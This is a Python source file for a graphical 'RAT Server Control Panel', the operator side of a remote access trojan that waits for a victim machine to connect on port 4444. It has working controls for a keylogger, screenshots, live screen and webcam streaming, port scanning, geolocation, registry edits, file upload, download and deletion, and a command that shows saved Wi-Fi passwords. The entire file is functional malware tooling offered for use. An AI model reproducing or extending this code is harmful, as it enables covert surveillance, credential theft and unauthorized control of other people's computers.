import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import socket
import threading
import random
import os
from vidstream import StreamingServer

class MessageDialog:
    def __init__(self, parent, client, output_callback):
        self.dialog = tk.Toplevel(parent)
        self.dialog.title("Send Message")
        self.dialog.geometry("400x300")
        self.dialog.transient(parent)
        self.dialog.grab_set()
        self.client = client
        self.output_callback = output_callback
        
        # Center the dialog
        self.dialog.geometry("+%d+%d" % (
            parent.winfo_rootx() + parent.winfo_width()/2 - 200,
            parent.winfo_rooty() + parent.winfo_height()/2 - 150))
        
        # Title
        ttk.Label(self.dialog, text="Title:").pack(pady=(20,5))
        self.title_entry = ttk.Entry(self.dialog, width=50)
        self.title_entry.pack(pady=(0,10))
        
        # Message
        ttk.Label(self.dialog, text="Message:").pack(pady=(10,5))
        self.message_text = scrolledtext.ScrolledText(self.dialog, width=40, height=6)
        self.message_text.pack(pady=(0,10))

        # Buttons frame
        button_frame = ttk.Frame(self.dialog)
        button_frame.pack(pady=(5,10))

        # Send button
        send_button = ttk.Button(button_frame, text="Send", command=self.send_message)
        send_button.pack(side=tk.LEFT, padx=5)

        # Cancel button
        cancel_button = ttk.Button(button_frame, text="Cancel", command=self.dialog.destroy)
        cancel_button.pack(side=tk.LEFT, padx=5)

    def send_message(self):
        message = self.message_text.get("1.0", tk.END).strip()
        title = self.title_entry.get().strip()
        
        if not message or not title:
            messagebox.showwarning("Warning", "Please enter both title and message")
            return
            
        try:
            # Send the command first
            self.client.send('sendmessage'.encode())
            
            # Wait a bit before sending the message and title
            self.dialog.after(100)
            
            # Send the message
            self.client.send(message.encode())
            
            # Wait a bit before sending the title
            self.dialog.after(100)
            
            # Send the title
            self.client.send(title.encode())
            
            # Wait for response
            try:
                result = self.client.recv(1024).decode()
                self.output_callback(result)
            except Exception as e:
                self.output_callback(f"Error receiving response: {str(e)}")
            
            # Close the dialog
            self.dialog.destroy()
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to send message: {str(e)}")
            self.dialog.destroy()

class RATGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("RAT Server Control Panel")
        self.root.geometry("1400x850")
        
        # Server variables
        self.host = '10.1.1.5'
        self.port = 4444
        self.client = None
        self.addr = None
        self.s = None
        self.server = None
        self.is_connected = False
        self.is_keylogger_running = False
        
        # Configure style
        self.style = ttk.Style()
        self.style.configure('Header.TLabel', font=('Helvetica', 12, 'bold'))
        self.style.configure('CommandFrame.TLabelframe', padding=10)
        
        self.create_gui()
        
    def create_gui(self):
        # Main container
        main_container = ttk.Frame(self.root, padding="10")
        main_container.grid(row=0, column=0, sticky="nsew")
        self.root.grid_columnconfigure(0, weight=1)
        self.root.grid_rowconfigure(0, weight=1)
        
        # Split into left and right panels
        left_panel = self.create_left_panel(main_container)
        right_panel = self.create_right_panel(main_container)
        
        left_panel.grid(row=0, column=0, sticky="nsew", padx=(0, 5))
        right_panel.grid(row=0, column=1, sticky="nsew", padx=(5, 0))
        
        main_container.grid_columnconfigure(0, weight=2)
        main_container.grid_columnconfigure(1, weight=1)
        
    def create_left_panel(self, parent):
        left_panel = ttk.Frame(parent)

        # Server configuration frame
        config_frame = ttk.LabelFrame(left_panel, text="Server Configuration", padding=10)
        config_frame.pack(fill=tk.X, pady=(0, 10))

        ttk.Label(config_frame, text="Host:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.host_entry = ttk.Entry(config_frame)
        self.host_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.host_entry.insert(0, self.host)

        ttk.Label(config_frame, text="Port:").grid(row=1, column=0, padx=5, pady=5, sticky="w")
        self.port_entry = ttk.Entry(config_frame)
        self.port_entry.grid(row=1, column=1, padx=5, pady=5, sticky="ew")
        self.port_entry.insert(0, str(self.port))

        # Server controls frame
        status_frame = ttk.LabelFrame(left_panel, text="Server Status", padding=10)
        status_frame.pack(fill=tk.X, pady=(0, 10))

        self.status_label = ttk.Label(status_frame, text="Status: Disconnected")
        self.status_label.pack(side=tk.LEFT, padx=5)

        ttk.Button(status_frame, text="Start Server", command=self.start_server).pack(side=tk.RIGHT, padx=5)
        ttk.Button(status_frame, text="Stop Server", command=self.stop_server).pack(side=tk.RIGHT, padx=5)

        # Output area
        output_frame = ttk.LabelFrame(left_panel, text="Output", padding=10)
        output_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))

        self.output_text = scrolledtext.ScrolledText(
            output_frame,
            wrap=tk.WORD,
            height=25,
            font=('Consolas', 10)
        )
        self.output_text.pack(fill=tk.BOTH, expand=True)
        
        # Add horizontal scrollbar
        h_scroll = ttk.Scrollbar(output_frame, orient=tk.HORIZONTAL, command=self.output_text.xview)
        self.output_text.configure(xscrollcommand=h_scroll.set, wrap=tk.NONE)
        h_scroll.pack(fill=tk.X, side=tk.BOTTOM)

        ttk.Button(output_frame, text="Clear Output", command=self.clear_output).pack(pady=(5, 0))

        # Command input
        cmd_frame = ttk.LabelFrame(left_panel, text="Command Input", padding=10)
        cmd_frame.pack(fill=tk.X)

        self.command_entry = ttk.Entry(cmd_frame)
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.command_entry.bind('<Return>', lambda e: self.send_command(self.command_entry.get()))

        ttk.Button(cmd_frame, text="Send", command=lambda: self.send_command(self.command_entry.get())).pack(side=tk.RIGHT)

        return left_panel
        
    def create_right_panel(self, parent):
        right_panel = ttk.Frame(parent)
        
        # Quick commands sections
        sections = [
            ("System Control", [
                ("Task List", "tasklist"),
                ("CPU Cores", "cpu_cores"),
                ("Local Time", "localtime"),
                ("Current PID", "curpid"),
                ("System Info", "sysinfo"),
                ("Send Message", "sendmessage")  # Added Send Message button
            ]),
            ("Keylogger", [
                ("Start Keylogger", "keyscan_start"),
                ("Stop Keylogger", "stop_keylogger"),
                ("Get Logs", "send_logs")
            ]),
            ("Volume Control", [
                ("Volume Up", "volumeup"),
                ("Volume Down", "volumedown")
            ]),
            ("Network", [
                ("IP Config", "ipconfig"),
                ("Port Scan", "portscan"),
                ("Geolocate", "geolocate")
            ]),
            ("Video", [
                ("Screenshot", "screenshot"),
                ("Screen Share", "screenshare"),
                ("Webcam", "webcam"),
                ("Webcam Snap", "webcam_snap"),
                ("Stop Stream", "breakstream")
            ])
        ]
        
        for section_name, commands in sections:
            frame = ttk.LabelFrame(right_panel, text=section_name, style='CommandFrame.TLabelframe')
            frame.pack(fill=tk.X, pady=(0, 10))
            
            for i, (btn_text, cmd) in enumerate(commands):
                btn = ttk.Button(frame, text=btn_text, 
                               command=lambda c=cmd: self.handle_command_button(c))
                btn.grid(row=i//2, column=i%2, padx=5, pady=5, sticky="ew")
                frame.grid_columnconfigure(i%2, weight=1)
        
        # Help button
        ttk.Button(right_panel, text="Help", command=self.show_help).pack(fill=tk.X, pady=(0, 10))
        
        return right_panel

    def handle_command_button(self, command):
        """Handle button clicks for commands"""
        if command == "sendmessage":
            if not self.is_connected:
                messagebox.showerror("Error", "Server not connected!")
                return
            dialog = MessageDialog(self.root, self.client, self.append_output)
            self.root.wait_window(dialog.dialog)
        else:
            self.send_command(command)
        
    def append_output(self, text):
        try:
            line_count = int(self.output_text.index('end-1c').split('.')[0])
            if line_count > 1000:
                self.output_text.delete('1.0', f'{line_count-1000}.0')
            
            self.output_text.insert(tk.END, f"{text}\n")
            self.output_text.see(tk.END)
        except Exception as e:
            self.output_text.insert(tk.END, f"Error displaying output: {str(e)}\n")
            self.output_text.see(tk.END)
        
    def clear_output(self):
        self.output_text.delete(1.0, tk.END)
        
    def update_status(self, text):
        self.status_label.config(text=f"Status: {text}")
        
    def start_server(self):
        if not self.is_connected:
            self.host = self.host_entry.get().strip()
            self.port = int(self.port_entry.get().strip())

            threading.Thread(target=self.build_connection, daemon=True).start()
            self.update_status(f"Waiting for connection on {self.host}:{self.port}...")
            
    def build_connection(self):
        try:
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.bind((self.host, self.port))
            self.s.listen(5)
            self.append_output("[*] Waiting for the client...")
            self.client, self.addr = self.s.accept()
            ipcli = self.client.recv(1024).decode()
            self.append_output(f"[*] Connection established successfully with {ipcli}")
            self.is_connected = True
            self.update_status("Connected")
        except Exception as e:
            self.append_output(f"Error: {str(e)}")
            self.update_status("Connection Failed")
            
    def stop_server(self):
        if self.is_connected:
            try:
                self.send_command('exit')
                self.client.close()
                self.s.close()
                self.is_connected = False
                self.append_output("Server stopped")
                self.update_status("Disconnected")
            except Exception as e:
                self.append_output(f"Error stopping server: {str(e)}")
                
    def send_command(self, command):
        if not command:
            return
            
        if not self.is_connected:
            messagebox.showerror("Error", "Server not connected!")
            return
            
        try:
            self.append_output(f"> {command}")
            
            # Handle special commands that need additional input
            if command == 'setvalue':
                const = messagebox.askstring("Input", "Enter the HKEY_* constant:")
                root = messagebox.askstring("Input", "Enter the path to store key:")
                key = messagebox.askstring("Input", "Enter the key name:")
                value = messagebox.askstring("Input", "Enter the value of key:")
                if all([const, root, key, value]):
                    self.client.send(command.encode())
                    self.client.send(const.encode())
                    self.client.send(root.encode())
                    self.client.send(key.encode())
                    self.client.send(value.encode())
                    result = self.client.recv(1024).decode()
                    self.append_output(result)
                    
            elif command == 'upload':
                file_path = messagebox.askstring("Input", "Enter the filepath to the file:")
                out_path = messagebox.askstring("Input", "Enter the filepath to outcoming file:")
                if file_path and out_path:
                    try:
                        self.client.send(command.encode())
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        self.client.send(out_path.encode())
                        self.client.send(data)
                        self.append_output("File has been sent")
                    except Exception as e:
                        self.append_output(f"Error uploading file: {str(e)}")
                        
            elif command.startswith('writein'):
                if len(command.split()) < 2:
                    messagebox.showerror("Error", "Usage: writein <text>")
                    return
                self.client.send(command.encode())
                result = self.client.recv(1024).decode()
                self.append_output(result)
                
            else:
                # Handle regular commands
                self.client.send(command.encode())
                
                # Commands that receive large data
                if command in ['screenshot', 'webcam_snap']:
                    file = self.client.recv(2147483647)
                    path = f'{os.getcwd()}\\{random.randint(11111,99999)}.png'
                    with open(path, 'wb') as f:
                        f.write(file)
                    self.append_output(f"File saved at: {os.path.abspath(path)}")
                    
                elif command in ['screenshare', 'webcam']:
                    try:
                        self.server = StreamingServer(self.host, 8080)
                        self.server.start_server()
                    except Exception as e:
                        self.append_output(f"Error starting stream: {str(e)}")
                        
                elif command == 'breakstream':
                    if self.server:
                        self.server.stop_server()
                        self.append_output("Stream stopped")
                        
                else:
                    # Regular command output
                    result = self.client.recv(1024).decode()
                    self.append_output(result)
                    
        except Exception as e:
            self.append_output(f"Error executing command: {str(e)}")
            
        finally:
            self.command_entry.delete(0, tk.END)
            
    def show_help(self):
        help_text = """Available Commands:

System Commands:
help                      - Show all commands
writein <text>           - Write text to current window
browser                  - Enter query to browser
turnoffmon              - Turn off monitor
turnonmon               - Turn on monitor
reboot                  - Reboot system
drivers                 - Show PC drivers
kill <process>          - Kill system task
sendmessage             - Send message box
cpu_cores               - Show CPU cores
systeminfo              - Show system info
tasklist                - Show running tasks
localtime               - Show current time
curpid                  - Show client PID
sysinfo                 - Show basic system info

Network Commands:
ipconfig                - Show local IP
portscan               - Scan ports
profiles               - Show network profiles
profilepswd            - Show profile password

File Operations:
delfile <file>          - Delete file
createfile <file>       - Create file
editfile <file> <text>  - Edit file
download <file> <dir>   - Download file
upload                  - Upload file
dir                     - List directory
pwd                     - Show current path

Video Commands:
screenshare             - View remote PC
webcam                  - Access webcam
screenshot              - Take screenshot
webcam_snap            - Take webcam photo
breakstream            - Stop video stream"""

        help_window = tk.Toplevel(self.root)
        help_window.title("Command Help")
        help_window.geometry("800x600")
        
        help_text_widget = scrolledtext.ScrolledText(
            help_window, 
            wrap=tk.WORD,
            width=80,
            height=30,
            font=('Consolas', 10)
        )
        help_text_widget.pack(padx=20, pady=20, fill=tk.BOTH, expand=True)
        help_text_widget.insert(tk.END, help_text)
        help_text_widget.config(state=tk.DISABLED)
        
    def run(self):
        self.root.mainloop()

if __name__ == '__main__':
    gui = RATGUI()
    gui.run()
